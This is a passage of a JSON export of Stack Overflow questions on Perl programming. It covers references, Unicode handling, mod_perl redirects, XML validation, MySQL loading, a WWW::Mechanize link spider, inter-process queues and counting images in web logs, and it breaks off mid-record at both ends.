failing. So, its sure that :- <code>$AwR[1]</code> is same as <code>$$RoR</code>. But, why <code>$$RoR-&gt;[1]</code> is not working while <code>$AwR[1]-&gt;[1]</code> is working? It's throwing me this error: -</p>\n\n<pre><code>Not a SCALAR reference at D:/_Perl Practice/3perldsc/array_of_array.pl line 24.\n</code></pre>\n\n<p>So, what's the difference in using it in two different way?</p>\n"},{"tags":["perl","decode","encode"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13163937,"title":"Perl Decode utf8 URL","body":"<pre><code>use URI::Escape;\nprint uri_unescape(\"%C3%B3\");\n</code></pre>\n\n<p>output : ÃÂ³</p>\n\n<p>decode with this <a href=\"http://meyerweb.com/eric/tools/dencoder/\" rel=\"nofollow\">http://meyerweb.com/eric/tools/dencoder/</a><br>\noutput : Ã³<br>\nthis is the expected one.</p>\n\n<p>What perl library should I use to get the correct output ? </p>\n\n<p>Thanks</p>\n"},{"tags":["perl","string","binary"],"answer_count":6,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":4424,"score":5,"question_id":3065923,"title":"In Perl, can I treat a string as a byte array?","body":"<p>In Perl, is it appropriate to use a string as a byte array containing 8-bit data? All the documentation I can find on this subject focuses on 7-bit strings.</p>\n\n<p>For instance, if I read some data from a binary file into <code>$data</code></p>\n\n<pre><code>my $data;\n\nopen FILE, \"&lt;\", $filepath;\nbinmode FILE;\nread FILE $data 1024;\n</code></pre>\n\n<p>and I want to get the first byte out, is <code>substr($data,1,1)</code> appropriate? (again, assuming it is 8-bit data)</p>\n\n<p>I come from a mostly C background, and I am used to passing a <code>char</code> pointer to a <code>read()</code> function. My problem might be that I don't understand what the underlying representation of a string is in Perl.</p>\n"},{"tags":["perl","unicode"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13160489,"title":"Perl unicode hash key lookup","body":"<p>I am so confused by the unicode and unicode in perl.</p>\n\n<p>I got this hash from MySQL db.</p>\n\n<pre><code>my $hashFromDB = { \"Ves\\x{101}kha\" =&gt; \"some value\" };\n</code></pre>\n\n<p>But I only know the key in this form of notation</p>\n\n<pre><code>my $key = \"Ves\\u0101kha\";\n</code></pre>\n\n<p>How can I convert that \\uXXXX notation to that \\x{xxx} so that I can get the value with the key.</p>\n\n<p>Thanks.</p>\n"},{"tags":["perl"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":13160462,"title":"Delete an array element completely","body":"<p><strong>Goal</strong>: Remove a particular Value from an array</p>\n\n<p>I have written a script and it works fine but I am not happy the way I have written it. So I am curious to know is there a better way to write it. please consider below use case:</p>\n\n<p>I have a nested hash/hash/array...like below. I need to remove any array values which has <code>local</code> in their name:</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse Data::Dumper;\n\nmy $hash = { esx1 =&gt; \n                    { cluster   =&gt; \"clu1\",\n                      fd        =&gt; \"fd1\",\n                      ds        =&gt; [ \n                                        'ds1',\n                                        'ds2',\n                                        'localds',\n                                    ],  \n                    },  \n            esx2 =&gt; \n                    { cluster   =&gt; \"clu2\",\n                      fd        =&gt; \"fd2\",\n                      ds        =&gt; [ \n                                        'ds3',\n                                        'ds4',\n                                        'dslocal',\n                                    ],  \n                    },  \n            };  \n\n\nforeach my $a ( keys %$hash )\n{\n    foreach ( 0..$#{ $hash-&gt;{$a}-&gt;{ds} } ) \n    {   \n        delete $hash-&gt;{$a}-&gt;{ds}-&gt;[$_] if $hash-&gt;{$a}-&gt;{ds}-&gt;[$_] =~ /local/i;\n        @{ $hash-&gt;{$a}-&gt;{ds} } = grep defined, @{ $hash-&gt;{$a}-&gt;{ds} };\n    }   \n}\n\nprint Dumper ($hash);\n</code></pre>\n\n<p>so the script deletes the \"<code>localds</code>\" and \"<code>dslocal</code>\" and keeps everything else intact.</p>\n\n<p><strong>Question</strong>:</p>\n\n<ol>\n<li>Is there a cleaner way to write the <code>foreach ( 0..$#{$hash-&gt;{$a}-&gt;{ds} } )</code> loop </li>\n<li>If I do not write the <code>grep</code> line above, the resultant array has the value containing <code>local</code> deleted but is replaced by <code>undef</code>. Why is this happening.</li>\n</ol>\n\n<p>Thanks.</p>\n"},{"tags":["perl","script"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":4,"view_count":46,"score":-3,"question_id":13160223,"title":"How to run Perl script on a windows machine?","body":"<p>What is the free solution to this problem?</p>\n"},{"tags":["perl","object","module","perl-oo"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13159263,"title":"How to access object features in Perl from within the same package","body":"<p>I'm making a Perl module and I am still getting to grips with how Perl deals with objects. \nThis is the <code>new</code> sub that I wrote to create an object and I have no problem updating elements:</p>\n\n<pre><code>sub new {\n    my $class = shift;\n    my ($self) = {\n        name =&gt; undef\n    };\n    bless($self, $class);\n    return $self;\n}\nsub get_name {\n    my $self = shift;\n    $self-&gt;{name} = 'Eve';\n    return $self-&gt;{name};\n}\n</code></pre>\n\n<p>I can use the object fine when I call the module and access it from another file, but I want to use the data in the object at other areas in the module code. </p>\n\n<p>So I have no problem doing this:</p>\n\n<pre><code>my $new_object = new ProgramTest; # ProgramTest being the module/package\nmy $name = get_name();\n</code></pre>\n\n<p>But I want to use the <code>$self</code> elements in a 'module-internal' method which is never accessed by an outside script. So I want to have something like this:</p>\n\n<pre><code>sub get_variables {\n    return (name); # I don't know how to get the name here \n    # (I plan to have other variables, too)\n}\n</code></pre>\n\n<p>I am probably missing something obvious (I'm sure I'll kick myself when I see the solution), so any help appreciated!\nI want this so that the rest of the module can use the variables (without changing) as there are conditions that rely on their values.</p>\n"},{"tags":["linux","perl","unique","connections"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":52,"score":0,"question_id":13159020,"title":"unique connected linux users with perl script","body":"<p>I need to know, at any given time, how many unique users are connected to a redhat server.  The following commands accomplish this easily:</p>\n\n<pre><code>who | awk '{ print $1 }' | sort -ud | wc -l\n</code></pre>\n\n<p>However, I need this functionality within a perl script, so that a network monitoring utility can run it at scheduled times, and track the number of unique connections over time.</p>\n\n<p>While I would like to learn scripting with perl, I have no idea how long it would take to learn to script this myself, and I don't have enough time to dedicate to learning perl at the moment.  Any assistance in creating a perl script with the above functionality would be greatly appreciated.</p>\n"},{"tags":["linux","perl","mod-perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13159728,"title":"Change perl for mod_perl","body":"<p>I've just installed a new version of perl on my linux webserver(upgrading from 5.10.1 to 5.12.4), and I'd hoped that everything will go smoothly but it seems that it didn't. The default perl version now in the system is the new one, but mod_perl is still stuck on the older version. My question is: can i just tell mod_perl to use the new version of perl, or do i have to reinstall it? From what i think there should be a way of just changing the interpreter and not reinstalling, but I wasn't able to find it yet.</p>\n"},{"tags":["perl","cgi","mod-perl2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13035432,"title":"Set-Cookie then redirect working under perl CGI, but not mod_perl","body":"<p>I've got a funny problem with setting a cookie and then redirecting under mod_perl. I've had a regular cgi environment up until now, and the set cookie/redirect has never been an issue; everything has worked as expected. When I turned on mod_perl however, I get a status 200 and an html body being sent with the redirect url in it. The cookie is always being placed after the header and before the document body, even though I'm printing it before the redirect. I trimmed down the script to bare-bones so you can see what I mean:</p>\n\n<pre><code>#!/usr/local/bin/perl\n\nuse strict;\nuse warnings;\n\nuse CGI;\n\nmy $cgi = new CGI;\n\nmy $cookie = CGI::cookie(\n  '-name'     =&gt; 'joe',\n  '-value'    =&gt; 'fred',\n  '-path'     =&gt; '/cgi-bin',\n  '-httponly' =&gt; 1,\n);\nprint \"Set-Cookie: $cookie\\n\";\n\nprint $cgi-&gt;redirect(-uri =&gt; 'http://xxx.com/cgi-bin/joe.cgi', -status =&gt; 303);\n</code></pre>\n\n<p>When I test this with curl under regular CGI, I get (domain name replaced and snipped for brevity):</p>\n\n<pre><code>&lt; HTTP/1.1 303 See Other\n&lt; Date: Tue, 23 Oct 2012 16:26:55 GMT\n&lt; Server: Apache/2.2.22 (Ubuntu)\n&lt; Set-Cookie: joe=fred; path=/cgi-bin; HttpOnly\n&lt; Location: http://xxx.com/cgi-bin/joe.cgi\n&lt; Content-Length: 0\n</code></pre>\n\n<p>...which is what I expect. When I test this under mod_perl, I get:</p>\n\n<pre><code>&lt; HTTP/1.1 200 OK\n&lt; Date: Tue, 23 Oct 2012 16:26:38 GMT\n&lt; Server: Apache/2.2.22 (Ubuntu)\n&lt; Location: http://xxx.com/cgi-bin/joe.cgi\n&lt; Transfer-Encoding: chunked\n&lt;\nSet-Cookie: joe=fred; path=/cgi-bin; HttpOnly\n&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;200 OK&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;\n&lt;h1&gt;OK&lt;/h1&gt;\n&lt;p&gt;The answer to your request is located &lt;a href=\"http://xxx.com/cgi-bin/joe.cgi\"&gt;here&lt;/a&gt;.&lt;/p&gt;\n&lt;hr&gt;\n&lt;address&gt;Apache/2.2.22 (Ubuntu) Server at xxx.com Port 80&lt;/address&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre>\n\n<p>I'm getting no warnings in logs. Any idea why mod_perl has decided to handle this redirect in such a bizarre way?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13153158,"title":"Make error log with column Number and line Number","body":"<p>I need Error log: i am doing tagging validation and DTD validation to xml files. </p>\n\n<p>XML:</p>\n\n<pre><code>    &lt;?xml version=\"1.0\"?&gt;\n &lt;purchaseOrder orderDate=\"1999-10-20\"&gt;\n    &lt;shipTo country=\"US\"&gt;\n       &lt;name&gt;Alice Smith&lt;/name&gt;\n       &lt;street&gt;123 Maple Street&lt;/street&gt;\n       &lt;city&gt;Mill Valley&lt;/city&gt;\n       &lt;state&gt;CA&lt;/state&gt;\n       &lt;zip&gt;90952&lt;/zip&gt;\n    &lt;/shipTo&gt;\n     &lt;billTo country=\"US\"&gt;\n        &lt;name&gt;Robert Smith&lt;/name&gt;\n        &lt;street&gt;8 Oak Avenue&lt;/street&gt;\n        &lt;city&gt;Old Town&lt;/city&gt;\n        &lt;state&gt;PA&lt;/state&gt;\n        &lt;zip&gt;95819&lt;/zip&gt;\n     &lt;/billTo&gt;\n     &lt;comment&gt;Hurry, my lawn is going wild&lt;!/comment&gt;\n     &lt;items&gt;\n        &lt;item partNum=\"872-AA\"&gt;\n           &lt;productName&gt;Lawnmower&lt;/productName&gt;\n           &lt;quantity&gt;1&lt;/quantity&gt;\n           &lt;USPrice&gt;148.95&lt;/USPrice&gt;\n           &lt;comment&gt;Confirm this is electric&lt;/comment&gt;\n        &lt;/item&gt;\n        &lt;item partNum=\"926-AA\"&gt;\n           &lt;productName&gt;Baby Monitor&lt;/productName&gt;\n           &lt;quantity&gt;1&lt;/quantity&gt;\n           &lt;USPrice&gt;39.98&lt;/USPrice&gt;\n           &lt;shipDate&gt;1999-05-21&lt;/shipDate&gt;\n        &lt;/item&gt;\n     &lt;/items&gt;\n  &lt;/purchaseOrder&gt;\n</code></pre>\n\n<p>Script:</p>\n\n<pre><code>    use XML::LibXML;\nmy $parser = XML::LibXML-&gt;new;\n$parser-&gt;validation(1);\n$parser-&gt;parse_file(\"purchase.xml\");\n</code></pre>\n\n<p>i got improper log, i need</p>\n\n<p>Error.log:\npurchase.xml:Line No: Column No: Error text</p>\n"},{"tags":["perl","find"],"answer_count":5,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":5282,"score":7,"question_id":3795490,"title":"How can I use File::Find in Perl?","body":"<p>I'm a bit confused from <code>File::Find</code> documentation... what is the equivalent to <code>$ find my_dir -maxdepth 2 -name \"*.txt\"</code>?</p>\n"},{"tags":["perl","split","binary-data","unpack"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13158976,"title":"Perl: Split binary data into byte array","body":"<p>(just trying to document this; self answer to follow)</p>\n\n<p>I basically wanted to convert a binary string to an array/list of bytes (<em>so as to allow indexing, and avoid using <code>substr</code>, because its syntax complicates things for me</em>), and I came up with the following MWE:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse warnings;\nuse strict;\n\n# use open ':raw';      # Unknown PerlIO layer class ':raw'\nuse open IO =&gt; ':raw';\n\nbinmode(STDIN);\nbinmode(STDOUT);\n\n# create orig 8-bit byte array/list\nmy @atmp = (0x80, 0x23, 0x14, 0x0d, 0x0a, 0x00, 0x00, 0x80, 0x43, 0x00, 0x00);\n\n# make a copy of portion\nmy @atmp2 = (0) x 2;\n@atmp2[0..1] = @atmp[7..8];\n\n# print output\nprint \"Copied atmp2 contents as hex: \" . join(\", \", unpack(\"H2\"x2, pack(\"C\"x2,@atmp2))) . \"\\n\";\nprint \"Copied atmp2 as ushort (16bit) int: \" . unpack(\"S\", pack(\"C\"x2, @atmp2));\n# doublecheck value by routing through printf with format specifier:\nprintf(\" [%d]\\n\", unpack(\"S\", pack(\"C\"x2, @atmp2)));\n\n\n# now, the same data as string:\nmy $indata = \"\\x80\\x23\\x14\\x0d\\x0a\\x00\\x00\\x80\\x43\\x00\\x00\";\n\n# create byte array (by converting string $indata to array/list with `split`)\nmy @btmp = split('',$indata);\nprint \"lastindex: \" . $#btmp . \"\\n\";\n\n# make a copy of portion\nmy @btmp2 = (0) x 2;\n@btmp2[0..1] = @btmp[7..8];\n\n# print output\nprint \"Copied btmp2 contents as hex: \" . join(\", \", unpack(\"H2\"x2, pack(\"C\"x2,@btmp2))) . \"\\n\";\nprint \"Copied btmp2 as ushort (16bit) int: \" . unpack(\"S\", pack(\"C\"x2, @btmp2));\n# doublecheck value by routing through printf with format specifier:\nprintf(\" [%d]\\n\", unpack(\"S\", pack(\"C\"x2, @btmp2)));\n</code></pre>\n\n<p>Running this code results with: </p>\n\n<pre><code>$ perl test.pl \nCopied atmp2 contents as hex: 80, 43\nCopied atmp2 as ushort (16bit) int: 17280 [17280]\nlastindex: 10\nArgument \"M-\\0\" isn't numeric in pack at test.pl line 38.\nArgument \"C\" isn't numeric in pack at test.pl line 38.\nCopied btmp2 contents as hex: 00, 00\nCopied btmp2 as ushort (16bit) int: 0 [0]\n</code></pre>\n\n<p>How do I get the second part (btmp2) to behave the same as the first part (atmp2)? </p>\n"},{"tags":["perl","script"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":13153976,"title":"How to make sure that password is changed for a user in every 7 days in perl script","body":"<p>I am new to perl , What I want to do is make sure that every user keeps modifying his password at least once 7 days . In case he has not, the system will either provoke him to change the password or log him out . But in my case say the file containing all the user Id and password are in a file <code>userid_passwd.txt</code> . So If a single user modifies or changes his password the filestamp for  the <code>userid_passwd.txt</code> will get changed . So even If one user follows the norm of modifying the password once in a week and rest avoids it they will be able to log in .</p>\n\n<pre><code>open WORDSLIST, $filename\n    or die \"can't open wordlist: $!\";\n\nif (-M WORDSLIST &lt; 7.0) {  \n\n    while ($name = &lt;WORDSLIST&gt;) {\n        \\\\Do Something\n    }\n}\nclose WORDSLIST\n    or die \"couldn't close wordlist: $!\";\n</code></pre>\n\n<p>But the code part <code>if (-M WORDSLIST &lt; 7.0) {</code>  is not the thing I want as my file contains user id and password for each user in order which is latter assigned to a hash variable.</p>\n"},{"tags":["mysql","perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":13155057,"title":"load local infile not allowed perl mysql","body":"<p>Who knows how to turn on load local infile settings in the latest MySQL on Ubuntu? I edited the  <code>/etc/mysql/my.cnf</code> file and added</p>\n\n<pre><code>local-infile=1\n</code></pre>\n\n<p>And in the Perl code </p>\n\n<pre><code>dbConnectString=dbi:mysql:orthomcl:mysqllocalinfile=1\n</code></pre>\n\n<p>but still get</p>\n\n<pre><code>DBD::mysql::st execute failed: The used command is not allowed with this MySQL version...\n</code></pre>\n\n<p>It is used by an application called OrthoMCL</p>\n\n<p>I tried configuring <code>my.cnf</code> file:</p>\n\n<pre><code>sudo vim /etc/mysql/my.cnf\n\n[mysqld]\nuser            = mysql\npid-file        = /var/run/mysqld/mysqld.pid\nsocket          = /var/run/mysqld/mysqld.sock\nport            = 3306\nbasedir         = /usr\ndatadir         = /var/lib/mysql\ntmpdir          = /tmp\nlc-messages-dir = /usr/share/mysql\nskip-external-locking\nlocal-infile = 1\n[mysql]\n#no-auto-rehash # faster start of mysql but no tab completition\nlocal-infile = 1\n</code></pre>\n\n<p>Then a restart of the mysql server:</p>\n\n<pre><code>sudo service mysql restart\nmysql stop/waiting\nmysql start/running, process 9563\n</code></pre>\n\n<p>But then I still get:</p>\n\n<pre><code>DBD::mysql::st execute failed: The used command is not allowed with this MySQL version at ../Apps/orthomclSoftware-v2.0.3/bin/orthomclLoadBlast line 39, &lt;F&gt; line 12.\nThe used command is not allowed with this MySQL version at ../Apps/orthomclSoftware-v2.0.3/bin/orthomclLoadBlast line 39, &lt;F&gt; line 12.`\n</code></pre>\n\n<p>Line 39 is:</p>\n\n<pre><code>$stmt-&gt;execute() or die DBI::errstr;\n</code></pre>\n\n<p>which executes the lines above:</p>\n\n<pre><code>my $sql = \"\nLOAD DATA\nLOCAL INFILE \\\"$blastFile\\\"\nREPLACE INTO TABLE $sst\nFIELDS TERMINATED BY '\\\\t'\n\";\nmy $stmt = $dbh-&gt;prepare($sql) or die DBI::errstr;\n</code></pre>\n"},{"tags":["mysql","perl","utf-8"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":13155422,"title":"utf8 enconding in Perl and MySql","body":"<p>my database (MySql) has a utf8_general collation. I am accessing data from database and showing a webpage (developed in Perl), it is showing Swedish characters (Ã¤,Ã¥,Ã¶) with a different characters. I checked in Mysql database, there I can see the data with Ã¤,Ã¥,Ã¶ characters in it. It seems, there is a encoding problem while accessing data. While connecting to database, used following code</p>\n\n<pre><code>my($dbh) = DBI-&gt;connect($config{'dbDriver'},$config{'dbUser'},$config{'dbPass'}) or die \"Kunde inte ansluta till $config{'dataSource'}: \" . $DBI::errstr;\n$dbh-&gt;{'mysql_enable_utf8'} = 1;\n$dbh-&gt;do('set names utf8');\n</code></pre>\n\n<p>Any help is appreaciated ! </p>\n\n<p>Thanks.</p>\n"},{"tags":["perl","apache"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13143357,"title":"Apache doesn't see pm file","body":"<p>I have installed Apache 2.2 and strawberry perl. I have textxx.pm. And I prepare simple script</p>\n\n<pre><code>#!/usr/bin/perl\nuse textxx;\nprint(\"HelloWorld!\");\n</code></pre>\n\n<p>When I run it via cmd it works. When I run it via web browser I get and error: \nCan't locate textxx.pm in @INC (@INC contains: C:/strawberry/perl/site/lib C:/strawberry/perl/vendor/lib C:/strawberry/perl/lib .)</p>\n\n<p>It's weird because script without \"use\" works.</p>\n\n<p>My module is located at the same directory as script</p>\n"},{"tags":["perl","unix","command-line"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":13154336,"title":"Execute a command using a perl script","body":"<p>I have simple command in unix like </p>\n\n<pre><code>cat myfile.txt &gt;&amp;mytemp.txt&amp;\n</code></pre>\n\n<p>The above command will simply create a copy of the file myfile.txt.\nwhen i execute the command on the command line it returns me the process id like below:</p>\n\n<pre><code>&gt; cat myfile.txt &gt; &amp; mytemp.txt &amp;\n[1] 769\n&gt;\n</code></pre>\n\n<p>I am forming the same command inside a perl script and calling it with system as below:</p>\n\n<pre><code>my $cmd=\"cat myfile.txt&gt;&amp;mytemp.txt&amp;\";\nmy $info = system(\"$cmd\");\n</code></pre>\n\n<p>but the sytem command fails with the below error message:</p>\n\n<pre><code>sh: mytemp.txt: bad number\n</code></pre>\n\n<p>I even tried with escaping the <code>&gt;</code> and <code>&amp;</code>.But there is no change in the error message.\nMay i know the reason for this?where am i wrong here?</p>\n"},{"tags":["perl","utf-8","catalyst","dbix-class"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":13138698,"title":"How to properly use UTF-8-encoded data from Schema inside Catalyst app?","body":"<p>Data defined inside Catalyst app or in templates has correct encoding and is diplayed well, but from database everything non-<code>Latin1</code> is converted to <code>?</code>. I suppose problem should be in model class, which is such:</p>\n\n<pre><code>use strict;\nuse base 'Catalyst::Model::DBIC::Schema';\n\n__PACKAGE__-&gt;config(\n schema_class =&gt; 'vhinnad::Schema::DB',\n\n connect_info =&gt; {\n     dsn =&gt; 'dbi:mysql:test',\n     user =&gt; 'user',\n     password =&gt; 'password',\n     {\n         AutoCommit        =&gt; 1,\n         RaiseError        =&gt; 1,\n         mysql_enable_utf8 =&gt; 1,\n     },\n     'on_connect_do' =&gt; [\n             'SET NAMES utf8',\n     ],      \n     }\n);\n\n1;\n</code></pre>\n\n<p>I see no flaws here, but something must be wrong. I used my schema also with test scripts and data was well encoded and output was correct, but inside Catalyst app i did not get encoding right. Where may be the problem?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>For future reference i put solution here: i mixed in connect info old and new style. </p>\n\n<p>Old style is like <code>(dsn, username, passw, hashref_options, hashref_other options)</code> </p>\n\n<p>New style is <code>(dsn =&gt; dsn, username =&gt; username, etc)</code>, so right is to use:</p>\n\n<pre><code> connect_info =&gt; {\n     dsn               =&gt; 'dbi:mysql:test',\n     user              =&gt; 'user',\n     password          =&gt; 'password',\n     AutoCommit        =&gt; 1,\n     RaiseError        =&gt; 1,\n     mysql_enable_utf8 =&gt; 1,\n     on_connect_do     =&gt; [\n             'SET NAMES utf8',\n     ],      \n }\n</code></pre>\n"},{"tags":["perl","links","web-crawler","mechanize","spider"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":87,"score":3,"question_id":13148509,"title":"Perl WWW::Mechanize Web Spider. How to find all links","body":"<p>I am currently attempting to create a <strong>Perl webspider using WWW::Mechanize.</strong></p>\n\n<p>What I am trying to do is create a webspider that will <strong>crawl the whole site</strong> of the URL (entered by the user) and <strong>extract all of the links from every page</strong> on the site.</p>\n\n<p><strong>What I have so far:</strong></p>\n\n<pre><code>use strict;\nuse WWW::Mechanize;\n\nmy $mech = WWW::Mechanize-&gt;new();\n\nmy $urlToSpider = $ARGV[0];\n$mech-&gt;get($urlToSpider);\n\nprint \"\\nThe url that will be spidered is $urlToSpider\\n\";\n\nprint \"\\nThe links found on the url's starting page\\n\";\n\nmy @foundLinks = $mech-&gt;find_all_links();\n\nforeach my $linkList(@foundLinks) {\n\n    unless ($linkList-&gt;[0] =~ /^http?:\\/\\//i || $linkList-&gt;[0] =~ /^https?:\\/\\//i) {\n\n        $linkList-&gt;[0] = \"$urlToSpider\" . $linkList-&gt;[0];\n    }\n\n    print \"$linkList-&gt;[0]\";\n    print \"\\n\";\n}\n</code></pre>\n\n<p><strong>What it does:</strong></p>\n\n<p><strong>1.</strong> At present it will extract and list all links on the starting page</p>\n\n<p><strong>2.</strong> If the links found are in /contact-us or /help format it will add 'http://www.thestartingurl.com' to the front of it so it becomes 'http://www.thestartingurl.com/contact-us'.</p>\n\n<p><strong>The problem:</strong></p>\n\n<p>At the moment it also finds links to external sites which I do not want it to do, e.g if I want to spider 'http://www.tree.com' it will find links such as <a href=\"http://www.tree.com/find-us\" rel=\"nofollow\">http://www.tree.com/find-us</a>. \nHowever it will also find links to other sites like <a href=\"http://www.hotwire.com\" rel=\"nofollow\">http://www.hotwire.com</a>.</p>\n\n<p><strong>How do I stop it finding these external urls?</strong></p>\n\n<p>After finding all the urls on the page I then also want to save this new list of internal-only links to a new array called @internalLinks but cannot seem to get it working.</p>\n\n<p><strong>Any help is much appreciated, thanks in advance.</strong></p>\n"},{"tags":["multithreading","perl","unix"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13153160,"title":"shared queue between threads in different child processes","body":"<p>I have N fork()ed processes with M threads each (but of course, how else?). The threads are supposed to wait for jobs being submitted into some queue and eventually post some results within the same queue. All threads have the same priority and respect the same data flow (deque() a task, enque() it's results as a list of new tasks). How should I proceed with the queue implementation? </p>\n\n<p>I tried a quick rewrite of a <a href=\"http://search.cpan.org/~jdhedden/Thread-Queue-2.12/lib/Thread/Queue.pm\" rel=\"nofollow\">Thread::Queue</a> using an <a href=\"http://search.cpan.org/~msouth/IPC-Shareable-0.61/lib/IPC/Shareable.pm\" rel=\"nofollow\">IPC::Shareable</a> as a <a href=\"http://cpansearch.perl.org/src/JDHEDDEN/Thread-Queue-2.12/lib/Thread/Queue.pm\" rel=\"nofollow\">@queue</a>, with <a href=\"http://cpansearch.perl.org/src/JDHEDDEN/Thread-Queue-2.12/lib/Thread/Queue.pm\" rel=\"nofollow\">enqueue()/dequeue()</a> using a two-level (thread/process) lock,  but it turned out to be wrong (can't really <a href=\"http://search.cpan.org/~jdhedden/threads-shared-1.42/lib/threads/shared.pm\" rel=\"nofollow\">:share</a> <a href=\"http://search.cpan.org/~msouth/IPC-Shareable-0.61/lib/IPC/Shareable.pm\" rel=\"nofollow\">IPC::Shareable</a>'s tied array). I guess I did not want to have each thread carrying its own <a href=\"http://search.cpan.org/~msouth/IPC-Shareable-0.61/lib/IPC/Shareable.pm\" rel=\"nofollow\">IPC::Shareable</a> instance (without thinking too much)?</p>\n\n<p>Should I just freeze/thaw the tasks over an <a href=\"http://search.cpan.org/~mhx/IPC-SysV-2.03/lib/IPC/Msg.pm\" rel=\"nofollow\">IPC::Msg</a> and implement the locks and CVs with semaphores, keeping per-thread <a href=\"http://search.cpan.org/~mhx/IPC-SysV-2.03/lib/IPC/Msg.pm\" rel=\"nofollow\">IPC::Msg</a> instances? It sounds pretty weird to directly instantiate IPC primitives within a thread (hence my attempt to :share IPC::Shareables at thread level).</p>\n\n<p>Have some of you monks did it proper and sound same time? A flat implementation, with no middleware queue managers and such? Can you please share a thought, maybe a module?</p>\n\n<p>Thanks!</p>\n\n<p>P.S. I'd rather not opt for a heavy existing implementation like mpi, rabbitmq, etc.</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse Carp qw/croak/;\nuse threads;\nuse threads::shared;\n\nuse insert::your::queue::impl::here;     \n\nque_make_init();\n\nmy $numthreads = 4;\nmy $numprocs = 4;\n\nsub runthreads \n{\n    foreach (1..$numthreads) {\n    @retcodes = map { $_-&gt;join } threads-&gt;create( sub {\n        my $q = que_get_process_level_shared_instance();\n        while ( (my $task = @q-&gt;get())) {\n            @q-&gt;put(process($task));\n        }\n    });\n    }\n    #do_something(@retcodes) ...\n    exit(0);\n\n}\n\nmy %proctable = map {\n        croak unless defined (my $pid = fork());\n        runthreads if $pid == 0;\n        $pid =&gt; -1;\n    } (0..$numprocs-1);\n\n#waitpid(), etc\n__END__\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":13153608,"title":"Reversing array using array name and reference to array","body":"<p>I have declared an array, and a reference to that array like this: -</p>\n\n<pre><code>my @array = (1, 2, 3, 4);\nmy $aref = \\@array;\n</code></pre>\n\n<p>Now, I'm trying to reverse the array, using the array name and the reference name.</p>\n\n<pre><code>print reverse @array, \"\\n\";\nprint reverse @{$aref}, \"\\n\";\n</code></pre>\n\n<p>This is working fine, and printing the reversed array in both the cases: -</p>\n\n<pre><code>4321\n4321\n</code></pre>\n\n<p>However, if I try to print the reverse in the same line, its giving me a strange result: -</p>\n\n<pre><code>print reverse @array, reverse @{$aref}, \"\\n\";\n</code></pre>\n\n<p>Now, I got this output: -</p>\n\n<pre><code>1234\n4321\n</code></pre>\n\n<p>and if I add a newline in between: -</p>\n\n<pre><code>print reverse @array, \"\\n\", reverse @{$aref}, \"\\n\";\n</code></pre>\n\n<p>I got this output: -</p>\n\n<pre><code>1234\n\n4321\n</code></pre>\n\n<p><strong>So, there are two problems as you can see: -</strong></p>\n\n<ul>\n<li><strong>1st,</strong> The array is not getting reversed for using the name</li>\n<li><strong>2nd,</strong> there is an extra newline getting printed between the two reversed array.</li>\n</ul>\n\n<p>I can't understand this behaviour, why this could be happening. Also I went through the documentation of the function <code>reverse</code> to check whether there is mentioned any where about this behaviour, but I didn't dine any. Can anyone explain what's happening here?</p>\n"},{"tags":["perl","web","counter"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":13151430,"title":"need perl script to find count of images found in web log","body":"<p>I have web log files and I was having a lot of trouble, being new with perl. I just need a script to find a count of each of the images that were found. I was able to list them but I'm unsure of how to just get a count, say something like \"There were x jpgs and x gifs viewed\".</p>\n\n<p>My code so far looks like this:</p>\n\n<pre><code>use warnings;\nopen FILE, \"jan28.log\";\nwhile ($line = &lt;FILE&gt;) { \n\n    if ($line =~ /.jpg/) {\n\n        print $line;\n    } \n    elsif ($line =~ /.gif/) {\n\n        print $line;\n    }\n    elsif ($line =~ /tiff/) {\n\n        print $line; \n    }\n}\n</code></pre>\n\n<p>The web logs look like this.</p>\n\n<pre><code>24.131.83.162 - - [28/Jan/2007:00:00:00 -0500] \"GET /~taler/images/index_09.jpg   HTTP/1.1\" 200 1563\n207.46.98.53 - - [28/Jan/2007:00:00:04 -0500] 